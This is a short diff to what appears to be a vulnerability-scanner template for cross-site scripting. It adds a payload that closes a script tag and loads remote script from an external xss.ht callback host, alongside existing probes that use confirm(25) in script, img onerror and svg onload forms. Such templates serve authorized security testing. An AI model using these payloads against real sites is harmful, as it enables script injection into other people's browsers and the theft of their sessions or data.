@@ -15,6 +15,7 @@ requests:
 
     payloads:
        payload: 
+             - '"></script><script/src=https://just25testing.xss.ht></script>'
              - '"><script>confirm(25)</script>'
              - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
              - '"><svg/onload=confirm(25)>'
